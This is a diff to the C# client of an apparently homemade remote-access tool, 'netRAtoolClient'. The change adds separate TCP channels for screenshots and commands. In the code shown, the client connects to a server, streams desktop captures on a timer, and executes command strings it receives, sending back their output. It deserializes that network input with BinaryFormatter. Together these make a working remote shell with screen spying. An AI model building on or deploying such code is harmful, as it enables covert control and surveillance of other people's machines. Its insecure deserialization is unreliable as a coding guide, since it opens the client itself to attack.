@@ -10,9 +10,13 @@ namespace netRAtoolClient
 {
     public partial class Form1 : Form
     {
-        private readonly TcpClient client = new TcpClient();
+        private readonly TcpClient clientIMG = new TcpClient();
+        private readonly TcpClient clientCMD = new TcpClient();
         private NetworkStream mainStream;
-        private int portNumber = 7678;
+
+        private int portNumberIMG = 7679;
+        private int portNumberCMD = 7678;
+
         private string ipAddr = "127.0.0.1";
 
         private Thread ListeningServer;
@@ -31,16 +35,8 @@ namespace netRAtoolClient
         {
             BinaryFormatter binFormatter = new BinaryFormatter();
 
-            try
-            {
-                mainStream = client.GetStream();
-                binFormatter.Serialize(mainStream, "img");
-                binFormatter.Serialize(mainStream, TakeDesktop());
-            }
-            catch
-            {
-                Console.WriteLine("# SendDesktopImage: Execute error!!!"); ;
-            }
+            mainStream = clientIMG.GetStream();
+            binFormatter.Serialize(mainStream, TakeDesktop());
         }
 
         private String execCommand(String argCommand)
@@ -75,15 +71,13 @@ namespace netRAtoolClient
             {
                 try
                 {
-                    stream = client.GetStream();
+                    stream = clientCMD.GetStream();
 
                     outToServer = (String)binFormatterSend.Deserialize(stream);
                     Console.WriteLine("#EXEC: execute cmd: " + outToServer);
                     outToServer = execCommand(outToServer);
-                    Console.WriteLine(outToServer);
                     if (stream.CanWrite)
                     {
-                        binFormatterSend.Serialize(stream, "cmd");
                         binFormatterSend.Serialize(stream, outToServer);
                     }
                 }
@@ -104,17 +98,20 @@ namespace netRAtoolClient
         {
             try
             {
-                client.Connect(ipAddr, portNumber);
-                Console.WriteLine("#Client: Connected to server");
+                clientIMG.Connect(ipAddr, portNumberIMG);
+                Console.WriteLine("# clientIMG: Connected to server");
+
+                clientCMD.Connect(ipAddr, portNumberCMD);
+                Console.WriteLine("# clientCMD: Connected to server");
+
                 ListeningServer = new Thread(ListenFromServer);
 
-                //timer1.Start();
+                timer1.Start();
                 ListeningServer.Start();
             }
             catch(Exception)
             {
-                Console.WriteLine("#Client: Failed to connect");
-                //timer1.Stop();
+                Console.WriteLine("#Failed to connect");
             }
         }
 
